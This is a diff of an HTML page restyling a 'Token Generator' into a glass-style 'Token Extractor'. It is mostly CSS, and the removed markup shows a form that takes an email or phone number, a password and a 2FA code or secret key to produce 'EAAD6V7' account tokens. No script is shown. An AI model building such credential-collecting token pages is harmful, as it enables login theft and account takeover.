@@ -1,624 +1,950 @@
-<!DOCTYPE html>
+   <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EAAD6V7 Token Generator | Vedant</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>Token Extractor | Veer Anurag</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html {
+            height: 100%;
+            -webkit-text-size-adjust: 100%;
         }
 
         body {
-            font-family: 'Rajdhani', sans-serif;
-            background: linear-gradient(135deg, #0a0e17 0%, #0d1525 50%, #0a0e17 100%);
-            min-height: 100vh;
-            color: #fff;
+            font-family: 'Inter', system-ui, sans-serif;
+            min-height: 100dvh;
+            min-height: -webkit-fill-available;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: clamp(16px, 5vw, 32px);
             overflow-x: hidden;
-        }
-
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 30px 20px;
-        }
-
-        /* Profile Section */
-        .profile-section {
-            text-align: center;
-            margin-bottom: 40px;
-        }
-
-        .profile-ring {
+            overflow-y: auto;
             position: relative;
-            width: 140px;
-            height: 140px;
-            margin: 0 auto 20px;
+            /* safe area for notched phones */
+            padding-top: max(clamp(16px,5vw,32px), env(safe-area-inset-top));
+            padding-bottom: max(clamp(16px,5vw,32px), env(safe-area-inset-bottom));
+            padding-left: max(clamp(16px,5vw,32px), env(safe-area-inset-left));
+            padding-right: max(clamp(16px,5vw,32px), env(safe-area-inset-right));
         }
 
-        .profile-ring::before {
+        /* ── Full-screen bg image ── */
+        .bg {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            background: url('https://i.postimg.cc/MHbbGQjn/Whats-App-Image-2026-03-25-at-1-28-08-PM.jpg') center center / cover no-repeat;
+        }
+
+        /* gentle dark vignette so edges are darker */
+        .bg::after {
             content: '';
             position: absolute;
-            top: -5px;
-            left: -5px;
-            right: -5px;
-            bottom: -5px;
+            inset: 0;
+            background: radial-gradient(ellipse at center, rgba(0,0,0,0.1) 0%, rgba(0,0,0,0.45) 100%);
+        }
+
+        /* ── Floating light orbs (add color depth) ── */
+        .orb {
+            position: fixed;
             border-radius: 50%;
-            background: conic-gradient(from 0deg, #00f5ff, #0080ff, #00f5ff, #0080ff, #00f5ff);
-            animation: rotate-ring 3s linear infinite;
-        }
-
-        .profile-ring::after {
-            content: '';
-            position: absolute;
-            top: -5px;
-            left: -5px;
-            right: -5px;
-            bottom: -5px;
-            border-radius: 50%;
-            background: conic-gradient(from 0deg, #00f5ff, #0080ff, #00f5ff, #0080ff, #00f5ff);
-            filter: blur(15px);
-            opacity: 0.7;
-            animation: rotate-ring 3s linear infinite;
-        }
-
-        @keyframes rotate-ring {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .profile-img {
-            position: relative;
+            pointer-events: none;
             z-index: 1;
-            width: 130px;
-            height: 130px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 4px solid #0a0e17;
-            margin: 5px;
+            filter: blur(80px);
+            opacity: 0.35;
+            animation: drift 14s ease-in-out infinite alternate;
+        }
+        .orb-a { width: 500px; height: 500px; background: radial-gradient(circle, #c026d3, transparent); top: -10%; left: -5%; animation-delay: 0s; }
+        .orb-b { width: 420px; height: 420px; background: radial-gradient(circle, #2563eb, transparent); bottom: -10%; right: -5%; animation-delay: -7s; }
+        .orb-c { width: 320px; height: 320px; background: radial-gradient(circle, #7c3aed, transparent); top: 30%; right: 5%; animation-delay: -3s; }
+
+        @keyframes drift {
+            0%   { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(20px, -30px) scale(1.06); }
         }
 
-        .profile-name {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 32px;
-            font-weight: 700;
-            color: #ffffff;
-            margin-bottom: 8px;
-            letter-spacing: 8px;
-            text-transform: uppercase;
-        }
-
-        .profile-subtitle {
-            font-size: 16px;
-            color: #888;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-        }
-
-        /* Card Styles */
+        /* ── MAIN GLASS CARD ── */
         .card {
-            background: rgba(13, 21, 37, 0.8);
-            border: 1px solid rgba(0, 245, 255, 0.2);
-            border-radius: 16px;
-            padding: 30px;
-            margin-bottom: 25px;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 0 30px rgba(0, 245, 255, 0.1);
-        }
-
-        .card-title {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 18px;
-            color: #00f5ff;
-            margin-bottom: 25px;
-            text-align: center;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        /* Form Styles */
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 14px;
-            color: #aaa;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 15px 18px;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(0, 245, 255, 0.3);
-            border-radius: 10px;
-            color: #fff;
-            font-family: 'Rajdhani', sans-serif;
-            font-size: 16px;
-            transition: all 0.3s ease;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: #00f5ff;
-            box-shadow: 0 0 15px rgba(0, 245, 255, 0.3);
-        }
-
-        .form-group input::placeholder {
-            color: #555;
-        }
-
-        .optional-tag {
-            color: #666;
-            font-size: 12px;
-            font-weight: normal;
-        }
-
-        .password-wrapper {
             position: relative;
-        }
-
-        .password-wrapper input {
-            padding-right: 50px;
-        }
-
-        .toggle-password {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: #00f5ff;
-            cursor: pointer;
-            font-size: 18px;
-            padding: 5px;
-        }
-
-        .toggle-password:hover {
-            color: #fff;
-        }
-
-        /* Button Styles */
-        .btn {
+            z-index: 10;
             width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #00f5ff 0%, #0080ff 100%);
-            border: none;
-            border-radius: 10px;
-            color: #0a0e17;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 14px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
+            max-width: 460px;
+            background: rgba(255, 255, 255, 0.10);
+            backdrop-filter: blur(48px) saturate(200%) brightness(1.05);
+            -webkit-backdrop-filter: blur(48px) saturate(200%) brightness(1.05);
+            border-radius: clamp(20px, 4vw, 28px);
+            border: 1px solid rgba(255, 255, 255, 0.28);
+            padding: clamp(26px, 5vw, 40px) clamp(22px, 5vw, 36px);
+            box-shadow:
+                0 8px 32px rgba(0, 0, 0, 0.35),
+                0 2px 0 rgba(255, 255, 255, 0.25) inset,
+                0 -1px 0 rgba(0, 0, 0, 0.1) inset;
             overflow: hidden;
         }
 
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(0, 245, 255, 0.4);
+        /* top shimmer line */
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 10%; right: 10%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.7), transparent);
+            border-radius: 0 0 50% 50%;
         }
 
-        .btn:disabled {
-            opacity: 0.6;
+        /* ── HEADER ── */
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: clamp(18px, 4vw, 26px);
+        }
+
+        .logo-glass {
+            width: clamp(46px, 10vw, 56px);
+            height: clamp(46px, 10vw, 56px);
+            border-radius: 16px;
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.35);
+            display: flex; align-items: center; justify-content: center;
+            font-size: clamp(20px, 5vw, 26px);
+            flex-shrink: 0;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.2), 0 1px 0 rgba(255,255,255,0.3) inset;
+        }
+
+        .header-text { flex: 1; min-width: 0; }
+
+        .header-title {
+            font-size: clamp(16px, 4vw, 20px);
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: -0.4px;
+            text-shadow: 0 1px 8px rgba(0,0,0,0.3);
+        }
+
+        .header-sub {
+            font-size: clamp(10px, 2.5vw, 12px);
+            color: rgba(255,255,255,0.55);
+            margin-top: 2px;
+            font-weight: 400;
+        }
+
+        .version-pill {
+            padding: 5px 11px;
+            border-radius: 20px;
+            background: rgba(255,255,255,0.12);
+            border: 1px solid rgba(255,255,255,0.28);
+            font-size: clamp(9px, 2.2vw, 10px);
+            font-weight: 700;
+            color: rgba(255,255,255,0.8);
+            letter-spacing: 0.6px;
+            text-transform: uppercase;
+            white-space: nowrap;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+
+        /* ── STATUS ROW ── */
+        .status-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-bottom: clamp(16px, 4vw, 24px);
+        }
+
+        .status-pill {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            padding: 5px 11px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.10);
+            border: 1px solid rgba(255, 255, 255, 0.20);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            font-size: clamp(9px, 2.3vw, 10px);
+            font-weight: 600;
+            color: rgba(255,255,255,0.75);
+            letter-spacing: 0.4px;
+            text-transform: uppercase;
+        }
+
+        .s-dot {
+            width: 5px; height: 5px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            animation: blip 2s ease infinite;
+        }
+
+        .s-dot-enc    { background: #a78bfa; box-shadow: 0 0 5px #a78bfa; }
+        .s-dot-shield { background: #34d399; box-shadow: 0 0 5px #34d399; animation-delay: 0.6s; }
+        .s-dot-rate   { background: #fbbf24; box-shadow: 0 0 5px #fbbf24; animation-delay: 1.2s; }
+
+        @keyframes blip { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
+
+        /* ── GLASS DIVIDER ── */
+        .divider {
+            border: none;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            margin: clamp(14px, 3.5vw, 20px) 0;
+        }
+
+        /* ── SECTION LABEL ── */
+        .section-label {
+            font-size: clamp(9.5px, 2.3vw, 10.5px);
+            font-weight: 700;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            color: rgba(255,255,255,0.45);
+            margin-bottom: clamp(12px, 3vw, 16px);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .section-label::before {
+            content: '';
+            display: inline-block;
+            width: 18px; height: 1px;
+            background: rgba(255,255,255,0.35);
+        }
+
+        /* ── GLASS INPUTS ── */
+        .input-group { margin-bottom: clamp(10px, 2.5vw, 14px); }
+
+        .field-label {
+            display: block;
+            font-size: clamp(9.5px, 2.5vw, 11px);
+            font-weight: 600;
+            color: rgba(255,255,255,0.5);
+            letter-spacing: 0.7px;
+            text-transform: uppercase;
+            margin-bottom: 7px;
+        }
+
+        .input-wrapper { position: relative; }
+
+        input[type="text"],
+        input[type="password"],
+        input[type="number"] {
+            width: 100%;
+            padding: clamp(12px, 3vw, 14px) 44px clamp(12px, 3vw, 14px) 15px;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.20);
+            border-radius: 14px;
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+            font-size: 16px;
+            font-weight: 400;
+            outline: none;
+            transition: all 0.22s ease;
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        input[type="number"]::-webkit-inner-spin-button,
+        input[type="number"]::-webkit-outer-spin-button { -webkit-appearance: none; }
+        input[type="number"] { -moz-appearance: textfield; }
+
+        input::placeholder { color: rgba(255,255,255,0.25); font-size: 14px; }
+
+        input:focus {
+            background: rgba(255, 255, 255, 0.14);
+            border-color: rgba(255, 255, 255, 0.45);
+            box-shadow: 0 0 0 3px rgba(255,255,255,0.08);
+        }
+
+        .eye-btn {
+            position: absolute;
+            right: 12px; top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: rgba(255,255,255,0.45);
+            cursor: pointer;
+            font-size: 15px;
+            width: 32px; height: 32px;
+            display: flex; align-items: center; justify-content: center;
+            border-radius: 8px;
+            margin: 0; padding: 0;
+            transition: color 0.2s;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .eye-btn:hover { color: rgba(255,255,255,0.85); }
+
+        /* ── GLASS PRIMARY BUTTON ── */
+        .btn-primary {
+            width: 100%;
+            padding: clamp(13px, 3.5vw, 16px);
+            border: 1px solid rgba(255, 255, 255, 0.30);
+            border-radius: 14px;
+            font-family: 'Inter', sans-serif;
+            font-size: clamp(13px, 3.5vw, 15px);
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: clamp(8px, 2.5vw, 12px);
+            letter-spacing: 0.2px;
+            min-height: 50px;
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: transparent;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.22s ease;
+            color: #fff;
+            background: rgba(255, 255, 255, 0.18);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            box-shadow:
+                0 4px 24px rgba(0,0,0,0.25),
+                0 1px 0 rgba(255,255,255,0.35) inset;
+            text-shadow: 0 1px 4px rgba(0,0,0,0.3);
+        }
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.12), transparent);
+            transition: left 0.5s ease;
+        }
+
+        @media (hover: hover) {
+            .btn-primary:not(:disabled):hover::before { left: 100%; }
+            .btn-primary:not(:disabled):hover {
+                background: rgba(255,255,255,0.26);
+                border-color: rgba(255,255,255,0.45);
+                box-shadow: 0 8px 32px rgba(0,0,0,0.3), 0 1px 0 rgba(255,255,255,0.4) inset;
+                transform: translateY(-1px);
+            }
+        }
+
+        .btn-primary:active { transform: scale(0.98); }
+
+        .btn-primary:disabled {
+            opacity: 0.4;
             cursor: not-allowed;
             transform: none;
         }
 
-        .btn-secondary {
-            background: transparent;
-            border: 1px solid #00f5ff;
-            color: #00f5ff;
-        }
-
-        .btn-secondary:hover {
-            background: rgba(0, 245, 255, 0.1);
-        }
-
-        /* Loader */
-        .loader {
+        /* ── SPINNER ── */
+        .spinner {
             display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(10, 14, 23, 0.3);
+            width: 14px; height: 14px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
             border-radius: 50%;
-            border-top-color: #0a0e17;
-            animation: spin 0.8s linear infinite;
-            margin-right: 10px;
+            animation: spin 0.65s linear infinite;
+            margin-right: 8px;
             vertical-align: middle;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* Result Section */
-        .result {
-            margin-top: 25px;
+        /* ── PROGRESS STEPS ── */
+        .progress-steps {
             display: none;
+            flex-direction: column;
+            gap: 7px;
+            margin-top: 14px;
+            padding: 14px;
+            border-radius: 14px;
+            background: rgba(255,255,255,0.06);
+            border: 1px solid rgba(255,255,255,0.13);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
         }
 
-        .result.show {
-            display: block;
+        .progress-steps.visible { display: flex; }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: clamp(10.5px, 2.8vw, 12px);
+            color: rgba(255,255,255,0.35);
+            transition: color 0.3s;
         }
 
-        .result-item {
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(0, 245, 255, 0.2);
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 15px;
+        .step.active { color: rgba(255,255,255,0.85); }
+        .step.done   { color: #6ee7b7; }
+
+        .step-icon {
+            width: 20px; height: 20px;
+            border-radius: 50%;
+            border: 1.5px solid rgba(255,255,255,0.15);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 9px;
+            flex-shrink: 0;
+            transition: all 0.3s;
         }
 
-        .result-item label {
-            display: block;
-            font-size: 12px;
-            color: #00f5ff;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 8px;
+        .step.active .step-icon { border-color: rgba(255,255,255,0.5); background: rgba(255,255,255,0.1); color: #fff; }
+        .step.done  .step-icon  { border-color: #6ee7b7; background: rgba(110,231,183,0.12); color: #6ee7b7; }
+
+        /* ── ALERT ── */
+        .alert {
+            display: flex;
+            align-items: flex-start;
+            gap: 9px;
+            border-radius: 12px;
+            padding: 12px 14px;
+            font-size: clamp(12px, 3.2vw, 13px);
+            font-weight: 500;
+            margin-top: 14px;
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
         }
 
-        .result-item textarea {
-            width: 100%;
-            padding: 12px;
-            background: rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(0, 245, 255, 0.1);
-            border-radius: 6px;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            resize: vertical;
-            min-height: 70px;
+        .alert.hidden { display: none; }
+
+        .alert-error {
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid rgba(239,68,68,0.30);
+            color: #fca5a5;
         }
 
-        .copy-btn {
-            display: inline-block;
-            padding: 8px 20px;
-            background: transparent;
-            border: 1px solid #00f5ff;
-            border-radius: 6px;
-            color: #00f5ff;
-            font-family: 'Rajdhani', sans-serif;
-            font-size: 12px;
-            font-weight: 600;
-            text-transform: uppercase;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: all 0.3s ease;
+        .alert-icon { font-size: 14px; flex-shrink: 0; margin-top: 1px; }
+
+        /* ── 2FA ── */
+        .twofa-box {
+            background: rgba(251,191,36,0.1);
+            border: 1px solid rgba(251,191,36,0.25);
+            border-radius: 14px;
+            padding: 13px 15px;
+            margin-bottom: 16px;
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
         }
 
-        .copy-btn:hover {
-            background: #00f5ff;
-            color: #0a0e17;
+        .twofa-title { font-size: clamp(12px,3.2vw,13px); font-weight: 700; color: #fcd34d; display: flex; align-items: center; gap: 7px; }
+        .twofa-sub   { font-size: clamp(10.5px,2.8vw,11.5px); color: rgba(252,211,77,0.55); margin-top: 3px; }
+
+        /* ── RESULTS ── */
+        .result-section { margin-top: 4px; }
+
+        .success-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(52,211,153,0.10);
+            border: 1px solid rgba(52,211,153,0.25);
+            border-radius: 14px;
+            padding: 13px 15px;
+            margin-bottom: 4px;
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
         }
 
-        /* Error/Success Messages */
-        .error-msg {
-            background: rgba(255, 50, 50, 0.1);
-            border: 1px solid rgba(255, 50, 50, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            color: #ff5555;
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        .success-msg {
-            background: rgba(0, 255, 100, 0.1);
-            border: 1px solid rgba(0, 255, 100, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            color: #00ff64;
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        /* Verify Section */
-        .verify-status {
-            text-align: center;
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 20px;
-            display: none;
-        }
-
-        .verify-status.valid {
-            display: block;
-            background: rgba(0, 255, 100, 0.1);
-            border: 1px solid rgba(0, 255, 100, 0.3);
-        }
-
-        .verify-status.invalid {
-            display: block;
-            background: rgba(255, 50, 50, 0.1);
-            border: 1px solid rgba(255, 50, 50, 0.3);
-        }
-
-        .verify-status.valid .status-icon {
-            color: #00ff64;
-            font-size: 48px;
-        }
-
-        .verify-status.invalid .status-icon {
-            color: #ff5555;
-            font-size: 48px;
-        }
-
-        .verify-status .status-text {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 18px;
-            margin-top: 10px;
-        }
-
-        .verify-status.valid .status-text {
-            color: #00ff64;
-        }
-
-        .verify-status.invalid .status-text {
-            color: #ff5555;
-        }
-
-        .user-info {
-            margin-top: 15px;
+        .success-circle {
+            width: 32px; height: 32px;
+            border-radius: 50%;
+            background: rgba(52,211,153,0.15);
+            border: 1.5px solid rgba(52,211,153,0.4);
+            display: flex; align-items: center; justify-content: center;
+            color: #6ee7b7;
             font-size: 14px;
-            color: #aaa;
+            flex-shrink: 0;
         }
 
-        .user-info span {
-            color: #00f5ff;
+        .success-title { font-size: clamp(12px,3.2vw,13px); font-weight: 700; color: #6ee7b7; }
+        .success-sub   { font-size: clamp(10px,2.5vw,11px); color: rgba(110,231,183,0.5); margin-top: 2px; }
+
+        .device-chip {
+            display: none;
+            align-items: center;
+            gap: 5px;
+            margin-top: 6px;
+            font-size: clamp(9px,2.3vw,10px);
+            font-weight: 600;
+            color: rgba(255,255,255,0.55);
         }
 
-        /* Footer */
+        .device-chip-dot { width: 5px; height: 5px; border-radius: 50%; background: #6ee7b7; box-shadow: 0 0 5px #6ee7b7; flex-shrink: 0; }
+
+        /* ── TOKEN BLOCKS ── */
+        .token-block { margin-bottom: 14px; }
+
+        .token-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 7px;
+        }
+
+        .token-label-text {
+            font-size: clamp(9.5px,2.5vw,10.5px);
+            font-weight: 700;
+            letter-spacing: 0.7px;
+            text-transform: uppercase;
+            color: rgba(255,255,255,0.45);
+            display: flex; align-items: center; gap: 6px;
+        }
+
+        .token-led { width: 5px; height: 5px; border-radius: 50%; }
+        .led-1 { background: #c084fc; box-shadow: 0 0 6px #c084fc; }
+        .led-2 { background: #67e8f9; box-shadow: 0 0 6px #67e8f9; }
+
+        .token-tag {
+            font-size: clamp(8px,2vw,9px);
+            font-weight: 700;
+            padding: 2px 8px;
+            border-radius: 6px;
+            letter-spacing: 0.4px;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+
+        .tag-1 { background: rgba(192,132,252,0.12); border: 1px solid rgba(192,132,252,0.28); color: #d8b4fe; }
+        .tag-2 { background: rgba(103,232,249,0.10); border: 1px solid rgba(103,232,249,0.28); color: #a5f3fc; }
+
+        .token-box {
+            background: rgba(0,0,0,0.22);
+            border: 1px solid rgba(255,255,255,0.10);
+            border-radius: 12px;
+            padding: 11px 13px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: clamp(9px,2.3vw,10.5px);
+            color: rgba(255,255,255,0.6);
+            word-break: break-all;
+            line-height: 1.65;
+            min-height: 55px;
+            user-select: all;
+            cursor: text;
+            overflow-wrap: break-word;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+
+        .token-actions { display: flex; gap: 7px; margin-top: 7px; }
+
+        .btn-sm {
+            flex: 1;
+            padding: 9px 10px;
+            border-radius: 10px;
+            font-family: 'Inter', sans-serif;
+            font-size: clamp(10.5px, 2.8vw, 11.5px);
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 0;
+            min-height: 40px;
+            border: 1px solid rgba(255,255,255,0.16);
+            background: rgba(255,255,255,0.08);
+            color: rgba(255,255,255,0.65);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            transition: all 0.18s;
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        @media (hover: hover) {
+            .btn-sm:hover { background: rgba(255,255,255,0.15); color: #fff; border-color: rgba(255,255,255,0.28); }
+        }
+
+        .btn-reveal {
+            flex: 0 0 auto;
+            padding: 9px 14px;
+        }
+
+        .btn-reset {
+            width: 100%;
+            padding: 13px;
+            border-radius: 14px;
+            font-family: 'Inter', sans-serif;
+            font-size: clamp(12px, 3.2vw, 13px);
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+            min-height: 48px;
+            border: 1px solid rgba(239,68,68,0.22);
+            background: rgba(239,68,68,0.08);
+            color: rgba(252,165,165,0.8);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            transition: all 0.18s;
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        @media (hover: hover) {
+            .btn-reset:hover { background: rgba(239,68,68,0.15); color: #fca5a5; }
+        }
+
+        .hidden { display: none !important; }
+
+        /* ── FOOTER ── */
         .footer {
             text-align: center;
-            padding: 30px 0;
-            color: #555;
-            font-size: 14px;
+            margin-top: clamp(16px,4vw,24px);
+            font-size: clamp(9.5px,2.3vw,10.5px);
+            font-weight: 500;
+            color: rgba(255,255,255,0.25);
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
         }
 
-        .footer span {
-            color: #ff4444;
+        /* ── ANIMATIONS ── */
+        @keyframes popIn {
+            0%   { transform: translateY(10px) scale(0.97); opacity: 0; }
+            100% { transform: translateY(0)     scale(1);    opacity: 1; }
         }
 
-        /* Glow Effects */
-        .glow-text {
-            text-shadow: 0 0 10px rgba(0, 245, 255, 0.5);
+        #resultBox { animation: popIn 0.32s ease; }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%      { transform: translateX(-5px); }
+            40%      { transform: translateX(5px); }
+            60%      { transform: translateX(-3px); }
+            80%      { transform: translateX(3px); }
         }
 
-        /* Animations */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+        .shake { animation: shake 0.35s ease; }
+
+        .masked { filter: blur(5px); user-select: none; }
+
+        /* ── RESPONSIVE — MOBILE FIRST ── */
+
+        /* Phones ≤ 480px: card fills full screen */
+        @media (max-width: 480px) {
+            body {
+                padding: 0;
+                align-items: flex-start;
+                /* keep safe-area via margin on card instead */
+            }
+
+            .card {
+                max-width: 100%;
+                width: 100%;
+                min-height: 100dvh;
+                min-height: -webkit-fill-available;
+                border-radius: 0;
+                border-left: none;
+                border-right: none;
+                border-top: none;
+                border-bottom: none;
+                /* inner padding with safe area */
+                padding-top: max(28px, env(safe-area-inset-top, 28px));
+                padding-bottom: max(28px, env(safe-area-inset-bottom, 28px));
+                padding-left: max(22px, env(safe-area-inset-left, 22px));
+                padding-right: max(22px, env(safe-area-inset-right, 22px));
+                box-shadow: none;
+                backdrop-filter: blur(40px) saturate(200%);
+                -webkit-backdrop-filter: blur(40px) saturate(200%);
+                /* center content vertically inside the full-height card */
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+            }
+
+            /* shrink the floating orbs a bit on mobile so they don't make bg too noisy */
+            .orb-a { width: 280px; height: 280px; }
+            .orb-b { width: 240px; height: 240px; }
+            .orb-c { width: 200px; height: 200px; }
+
+            /* Make status row wrap cleanly */
+            .status-row { gap: 5px; }
+            .status-pill { font-size: 9px; padding: 5px 9px; }
         }
 
-        .card {
-            animation: fadeIn 0.5s ease forwards;
+        /* Tight phones ≤ 360px: reduce spacing */
+        @media (max-width: 360px) {
+            .header { gap: 10px; margin-bottom: 14px; }
+            .logo-glass { width: 42px; height: 42px; border-radius: 13px; font-size: 19px; }
+            .header-title { font-size: 15px; }
+            .section-label { margin-bottom: 10px; }
+            input[type="text"],
+            input[type="password"],
+            input[type="number"] { padding: 11px 42px 11px 13px; }
+            .btn-primary { padding: 13px; min-height: 48px; }
         }
 
-        .card:nth-child(2) {
-            animation-delay: 0.1s;
-        }
+        /* Tablets & up ≥ 600px: centered card with padding */
+        @media (min-width: 600px) {
+            body {
+                align-items: center;
+                padding: 32px;
+                padding-top: max(32px, env(safe-area-inset-top));
+                padding-bottom: max(32px, env(safe-area-inset-bottom));
+            }
 
-        .card:nth-child(3) {
-            animation-delay: 0.2s;
+            .card {
+                border-radius: 28px;
+                max-width: 460px;
+                min-height: unset;
+                display: block;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Profile Section -->
-        <div class="profile-section">
-            <div class="profile-ring">
-                <img src="/static/prince.jpg" alt="Prince" class="profile-img">
-            </div>
-            <h1 class="profile-name">VEDANT PANDIT</h1>
-            <p class="profile-subtitle">Token Generator Pro</p>
-        </div>
 
-        <!-- Token Generator Card -->
-        <div class="card">
-            <h2 class="card-title">Generate EAAD6V7 Token</h2>
-            <form id="tokenForm">
-                <div class="form-group">
-                    <label>Email / Phone Number</label>
-                    <input type="text" id="email" placeholder="Enter email or phone number" required>
-                </div>
-                <div class="form-group">
-                    <label>Password</label>
-                    <div class="password-wrapper">
-                        <input type="password" id="password" placeholder="Enter password" required>
-                        <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
-                    </div>
-                </div>
-                <div class="form-group">
-                    <label>2FA Code <span class="optional-tag">(optional)</span></label>
-                    <input type="text" id="twofa" placeholder="6-digit code or secret key">
-                </div>
-                <button type="submit" class="btn" id="submitBtn">Generate EAAD6V7 Token</button>
-            </form>
+<!-- Background -->
+<div class="bg"></div>
+<div class="orb orb-a"></div>
+<div class="orb orb-b"></div>
+<div class="orb orb-c"></div>
 
-            <div id="result" class="result"></div>
-            <div id="errorMsg" class="error-msg" style="display: none;"></div>
-        </div>
+<!-- Glass Card -->
+<div class="card">
 
-        <!-- Verify Token Card -->
-        <div class="card">
